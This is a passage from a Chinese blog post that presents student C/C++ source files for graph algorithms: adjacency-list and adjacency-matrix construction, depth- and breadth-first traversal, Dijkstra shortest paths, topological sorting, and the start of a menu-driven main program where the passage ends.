<p><code>m_graph.h </code>    邻接矩阵创建 图结构定义 （为实现 求 最短路径做准备）</p>
<p><code>min.h</code>            Dijkastra 算法求 单源最短路径、输出 有向图 最短路径</p>
<p><code>r_graph.h</code>    带入度邻接表 存储结构 定义、AOV网络的创建（实现拓扑排序）</p>
<p><code>main.cpp</code>      主函数 （菜单、switch 结构选择菜单）</p>
</blockquote>
<h2 id="graph-h"><a href="#graph-h" class="headerlink" title="graph.h"></a>graph.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//预定义图的最大顶点数</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> visited[M];  <span class="comment">//作为访问的标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表创建 图结构定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> DataType;	<span class="comment">//顶点信息数据类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>	<span class="comment">//边表结点</span></span><br><span class="line">    <span class="keyword">int</span> adjvex;			<span class="comment">//邻接点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span>	<span class="comment">//指向下一个邻接点</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">vnode</span>&#123;</span>	<span class="comment">//头结点类型</span></span><br><span class="line">    DataType vertex;	<span class="comment">//顶点信息</span></span><br><span class="line">    EdgeNode *FirstEdge;<span class="comment">//邻接链表头指针</span></span><br><span class="line">&#125;VertexNode;			</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">linkedgraph</span>&#123;</span>			<span class="comment">//邻接表 类型</span></span><br><span class="line">    VertexNode adjlist[M];<span class="comment">//存放头结点的顺序表</span></span><br><span class="line">    <span class="keyword">int</span> n,e;			  <span class="comment">//图的顶点数、边数</span></span><br><span class="line">&#125;LinkedGraph;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_1</span><span class="params">(LinkedGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    EdgeNode *s;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    fp = <span class="built_in">fopen</span>(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);		<span class="comment">//读入顶点数与边数</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g-&gt;n;i++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;adjlist[i].vertex); <span class="comment">//读入顶点信息</span></span><br><span class="line">            g-&gt;adjlist[i].FirstEdge = <span class="literal">NULL</span>;    <span class="comment">//边表置为空表</span></span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">for</span>(k=<span class="number">0</span>; k &lt; g-&gt;e; k++)&#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);		<span class="comment">//输入无序对</span></span><br><span class="line">			s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(EdgeNode));</span><br><span class="line">			s-&gt;adjvex = j;</span><br><span class="line">			s-&gt;next = g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">			g-&gt;adjlist[i].FirstEdge = s;       <span class="comment">//相当于 前插</span></span><br><span class="line">			<span class="keyword">if</span>(c == <span class="number">0</span>)&#123;			<span class="comment">//无向图</span></span><br><span class="line">				s = (EdgeNode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(EdgeNode));</span><br><span class="line">				s-&gt;adjvex = i;</span><br><span class="line">				s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">				g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>		<span class="comment">//文件打开失败</span></span><br><span class="line">		g-&gt;n = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">	<span class="comment">//测试</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	printf(&quot;%d,%d&quot;,g-&gt;n,g-&gt;e);</span></span><br><span class="line"><span class="comment">	printf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">	for(i=0;i&lt;g-&gt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">		printf(&quot;%c&quot;,g-&gt;adjlist[i].vertex);</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;访问顶点：%c\n&quot;</span>,g.adjlist[i].vertex); <span class="comment">//访问顶点 i</span></span><br><span class="line">    visited[i] = <span class="number">1</span>;		<span class="comment">//表示已经访问过</span></span><br><span class="line">    p = g.adjlist[i].FirstEdge;		<span class="comment">//从 p 的邻接点开始进行 深度优先遍历</span></span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[p-&gt;adjvex])</span><br><span class="line">            <span class="built_in">dfs</span>(g,p-&gt;adjvex);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt;g.n; i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;   <span class="comment">//初始化都为 0 ，代表都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])		<span class="comment">//如果 i 未被访问过</span></span><br><span class="line">            <span class="built_in">dfs</span>(g,i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//广度优先遍历 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">(LinkedGraph g,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    EdgeNode *p;</span><br><span class="line">    <span class="keyword">int</span> queue[M],front,rear;  <span class="comment">//FIFO 队列</span></span><br><span class="line">    front = rear = <span class="number">0</span>;		 <span class="comment">//初始化空队列</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[i].vertex);</span><br><span class="line">    visited[i] = <span class="number">1</span>;</span><br><span class="line">    queue[rear++] = i;		<span class="comment">//被访问结点进入队列</span></span><br><span class="line">    <span class="keyword">while</span>(rear &gt; front)&#123;</span><br><span class="line">        j = queue[front++]; <span class="comment">// 出队</span></span><br><span class="line">        p = g.adjlist[j].FirstEdge;</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(visited[p-&gt;adjvex] == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[p-&gt;adjvex].vertex);</span><br><span class="line">                queue[rear++] = p-&gt;adjvex;</span><br><span class="line">                visited[p-&gt;adjvex] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回连通分量的个数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BfsTraverse</span><span class="params">(LinkedGraph g)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;  <span class="comment">//初始化标志数组，都未被访问过</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span> ;i&lt;g.n ;i++)</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])&#123;	<span class="comment">//vi未被访问过</span></span><br><span class="line">            <span class="comment">//printf(&quot;\n&quot;);</span></span><br><span class="line">            count++;		<span class="comment">//计数器：连通分量 个数加1 </span></span><br><span class="line">            <span class="built_in">bfs</span>(g,i);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="m-graph-h"><a href="#m-graph-h" class="headerlink" title="m_graph.h"></a>m_graph.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FINITY 5000		<span class="comment">//此处使用 5000 表示无穷大</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20			<span class="comment">//最大顶点数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;<span class="comment">//顶点值类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> edgetype;	<span class="comment">//权值类型</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">mgraph</span>&#123;</span>				<span class="comment">//邻接矩阵 类型</span></span><br><span class="line">    vertextype vexs[M];  	<span class="comment">//顶点信息域（一维数组）</span></span><br><span class="line">    edgetype edges[M][M];  	<span class="comment">//邻接矩阵（二维数组）</span></span><br><span class="line">    <span class="keyword">int</span> n,e;				<span class="comment">//图中顶点总数 与 边数</span></span><br><span class="line">&#125;Mgraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立网络邻接矩阵 创建 算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_2</span><span class="params">(Mgraph *g,<span class="keyword">char</span> *s,<span class="keyword">int</span> c)</span></span>&#123;  <span class="comment">//c=1表示建立有向图，c=0 表示建立无向图</span></span><br><span class="line">    <span class="keyword">int</span> i,j,k,w;</span><br><span class="line">    FILE *rf;</span><br><span class="line">    rf = <span class="built_in">fopen</span>(s,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(rf)&#123;</span><br><span class="line">        <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%ls&quot;</span>,&amp;g-&gt;vexs[i]);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g-&gt;n;i++)</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g-&gt;n;j++)</span><br><span class="line">                <span class="keyword">if</span>(i == j)</span><br><span class="line">					g-&gt;edges[i][j] = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">                    g-&gt;edges[i][j] = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)&#123;</span><br><span class="line">            <span class="built_in">fscanf</span>(rf,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;w);</span><br><span class="line">            g-&gt;edges[i][j] = w;</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="number">0</span>)</span><br><span class="line">                g-&gt;edges[j][i] = w;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fclose</span>(rf);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        g-&gt;n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="r-graph-h"><a href="#r-graph-h" class="headerlink" title="r_graph.h"></a>r_graph.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> M 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> vertextype;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带入度邻接表 存储结构 定义</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">aov_node</span>&#123;</span>  <span class="comment">//边结点类型定义</span></span><br><span class="line">	<span class="keyword">int</span> adjvex;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">aov_node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;edgenode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">de</span>&#123;</span>  <span class="comment">//带顶点入度的头结点定义</span></span><br><span class="line">	edgenode *FirstEdge;</span><br><span class="line">	vertextype vertex;</span><br><span class="line">	<span class="keyword">int</span> id;			<span class="comment">//顶点的入度域</span></span><br><span class="line">&#125;vertexnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">aovgraph</span>&#123;</span>		<span class="comment">// AOV 网络的邻接表结构</span></span><br><span class="line">	vertexnode adjlist[M];</span><br><span class="line">	<span class="keyword">int</span> n,e;</span><br><span class="line">&#125;AovGraph;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AOV 网络 邻接表 创建图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">create_3</span><span class="params">(AovGraph *g,<span class="keyword">char</span> *filename,<span class="keyword">int</span> c)</span>       <span class="comment">/*建立AOV网络的存储结构*/</span></span></span><br><span class="line"><span class="function"> </span>&#123; <span class="keyword">int</span> i,j,k;</span><br><span class="line">   edgenode  *s;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   fp=<span class="built_in">fopen</span>(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span> (fp)</span><br><span class="line">   &#123;</span><br><span class="line">   <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);  <span class="comment">/*输入图中的顶点数与边数*/</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)                        <span class="comment">/*输入顶点值*/</span></span><br><span class="line">      &#123;<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%1s&quot;</span>,&amp;g-&gt;adjlist[i].vertex);</span><br><span class="line">       g-&gt;adjlist[i].FirstEdge=<span class="literal">NULL</span>;</span><br><span class="line">       g-&gt;adjlist[i].id=<span class="number">0</span>;       <span class="comment">/*入度初始化为0*/</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)</span><br><span class="line">        &#123; <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);</span><br><span class="line">         s=(edgenode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(edgenode));</span><br><span class="line">         s-&gt;adjvex=j;</span><br><span class="line">         g-&gt;adjlist[j].id++;    <span class="comment">/*顶点j的入度加1*/</span></span><br><span class="line">         s-&gt;next=g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">         g-&gt;adjlist[i].FirstEdge=s;</span><br><span class="line">		 <span class="keyword">if</span>(c == <span class="number">0</span>)&#123;			<span class="comment">//无向图</span></span><br><span class="line">				s = (edgenode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(edgenode));</span><br><span class="line">				s-&gt;adjvex = i;</span><br><span class="line">				s-&gt;next = g-&gt;adjlist[j].FirstEdge;</span><br><span class="line">				g-&gt;adjlist[j].FirstEdge = s;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fclose</span>(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>		<span class="comment">//文件打开失败</span></span><br><span class="line">		g-&gt;n = <span class="number">0</span>; </span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//拓扑排序 算法 (队列 实现)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TopSort</span><span class="params">(AovGraph g)</span></span></span><br><span class="line"><span class="function"> </span>&#123;<span class="keyword">int</span> k=<span class="number">0</span>,i,j,v, flag[M];</span><br><span class="line">   <span class="keyword">int</span> queue[M];  <span class="comment">/*队列*/</span></span><br><span class="line">   <span class="keyword">int</span> h=<span class="number">0</span>,t=<span class="number">0</span>;</span><br><span class="line">   edgenode* p;</span><br><span class="line">   <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;g.n;i++)  flag[i]=<span class="number">0</span>;  <span class="comment">/*访问标记初始化*/</span></span><br><span class="line">    <span class="comment">/*先将所有入度为0的结点进队*/</span></span><br><span class="line">    <span class="comment">/*将程序补充完整*/</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        <span class="keyword">if</span> (g.adjlist[i].id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            queue[t++]=i;</span><br><span class="line">            flag[i]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="keyword">while</span> (h&lt;t)</span><br><span class="line">   &#123;</span><br><span class="line">       v=queue[h++];</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,g.adjlist[v].vertex);</span><br><span class="line">       k++;</span><br><span class="line">       p=g.adjlist[v].FirstEdge;</span><br><span class="line">       <span class="keyword">while</span> (p)</span><br><span class="line">       &#123;</span><br><span class="line">           j=p-&gt;adjvex;</span><br><span class="line">           g.adjlist[j].id--;</span><br><span class="line">           <span class="keyword">if</span> (g.adjlist[j].id==<span class="number">0</span> &amp;&amp; flag[j]==<span class="number">0</span>)</span><br><span class="line">           &#123;  queue[t++]=j;</span><br><span class="line">               flag[j]=<span class="number">1</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           p=p-&gt;next;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">return</span> k;  <span class="comment">//返回输出的顶点个数</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//打印 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(AovGraph g)</span></span></span><br><span class="line"><span class="function"></span>&#123;  edgenode *p;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">   &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c %d   &quot;</span>, g.adjlist[i].vertex,g.adjlist[i].id);</span><br><span class="line">     p=g.adjlist[i].FirstEdge;</span><br><span class="line">     <span class="keyword">while</span> (p)</span><br><span class="line">      &#123; <span class="built_in">printf</span>(<span class="string">&quot;%d--&gt;&quot;</span>,p-&gt;adjvex);</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="min-h"><a href="#min-h" class="headerlink" title="min.h"></a>min.h</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;m_graph.h&quot;</span>  <span class="comment">//邻接矩阵创建 图</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span>&#123;</span>FALSE,TRUE&#125; boolean;	<span class="comment">//false 0   true 1</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> dist[M];		<span class="comment">//距离向量类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> path[M];		<span class="comment">//路径类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Dijkastra 算法求 单源最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(Mgraph g,<span class="keyword">int</span> v0,path p,dist d)</span></span>&#123;</span><br><span class="line">    boolean <span class="keyword">final</span>[M]; <span class="comment">//标志 当前元素是否已经求出 最短路径</span></span><br><span class="line">    <span class="keyword">int</span> i,k,j,v,min,x;</span><br><span class="line">    <span class="comment">//初始化集合 S 与距离向量 d</span></span><br><span class="line">    <span class="keyword">for</span>(v=<span class="number">0</span>; v&lt;g.n; v++)&#123;</span><br><span class="line">        <span class="keyword">final</span>[v] = FALSE;</span><br><span class="line">        d[v] = g.edges[v0][v];</span><br><span class="line">        <span class="keyword">if</span>(d[v]&lt;FINITY &amp;&amp; d[v] != <span class="number">0</span>)</span><br><span class="line">            p[v] = v0;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p[v] = <span class="number">-1</span>;  <span class="comment">//v 无前驱</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span>[v0] = TRUE;</span><br><span class="line">    d[v0] = <span class="number">0</span>;			<span class="comment">//初始时 s 只有 v0 一个结点</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//依次找出 n-1 个结点加入 S 中</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        min = FINITY;</span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)  <span class="comment">//找最小边入结点</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; d[k] &lt; min)&#123;</span><br><span class="line">                v = k;</span><br><span class="line">                min = d[k];</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//测试：可省略</span></span><br><span class="line">        <span class="comment">//printf(&quot;\n%c----%d\n&quot;,g.vexs[v],min);</span></span><br><span class="line">        <span class="keyword">if</span>(min == FINITY)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">final</span>[v] = TRUE;  <span class="comment">//v 加入 S</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//修改 S 与 V-S 中各节点的距离</span></span><br><span class="line">        <span class="keyword">for</span>(k=<span class="number">0</span>; k&lt;g.n; ++k)</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">final</span>[k] &amp;&amp; (min+g.edges[v][k] &lt; d[k]) )&#123;</span><br><span class="line">                d[k] = min + g.edges[v][k];</span><br><span class="line">                p[k] = v;</span><br><span class="line">            &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出 有向图 最短路径</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_gpd</span><span class="params">(Mgraph g,path p,dist d)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> st[M],i,pre,top=<span class="number">-1</span>;			<span class="comment">//定义栈 st 初始化空栈</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;v0 到各个顶点的距离以及最短路径：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;g.n; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n距离：%2d，\t最短路径：&quot;</span>,d[i]);</span><br><span class="line">        st[++top] = i;</span><br><span class="line">        pre = p[i];</span><br><span class="line">        <span class="keyword">while</span>(pre != <span class="number">-1</span>)&#123;		<span class="comment">//从第 i 个顶点开始向前搜索最短路径上的顶点</span></span><br><span class="line">            st[++top] = pre;</span><br><span class="line">            pre = p[pre];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(top &gt;=<span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d--&gt;&quot;</span>,st[top--]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;m_graph.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;min.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;r_graph.h&quot;</span></span></span><br><span class="line"><span class="comment">//#include &quot;g_graph.h&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t1.深度优先遍历          2.广度优先遍历        \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t3.最短路径              4.关键路径        \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\t5.拓扑排序              0.退出        \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> select;</span><br><span class="line">	<span class="comment">//深度 广度 遍历测试---------------------------------------------</span></span><br><span class="line">    LinkedGraph g1;</span><br><span class="line">    <span class="keyword">int</span> count,i;</span><br><span class="line">	<span class="built_in">create_1</span>(&amp;g1,<span class="string">&quot;graph1.txt&quot;</span>,<span class="number">0</span>);  <span class="comment">// 0 代表无向图</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//最短路径 测试----------------------------------------------------</span></span><br><span class="line">	Mgraph g2;		<span class="comment">//有向图 邻接矩阵</span></span><br><span class="line">	path p;			<span class="comment">//路径向量</span></span><br><span class="line">	dist d;			<span class="comment">//最短路径向量</span></span><br><span class="line">	<span class="keyword">int</span> v0;				</span><br><span class="line">	<span class="comment">//create_2(&amp;g2,&quot;Mgraph1.txt&quot;,0);  // 0 代表无向图</span></span><br><span class="line">	<span class="built_in">create_2</span>(&amp;g2,<span class="string">&quot;Mgraph2.txt&quot;</span>,<span class="number">1</span>);  <span class="comment">// 1 代表有向图</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//拓扑排序 测试----------------------------------------------------</span></span><br><span class="line">	AovGraph 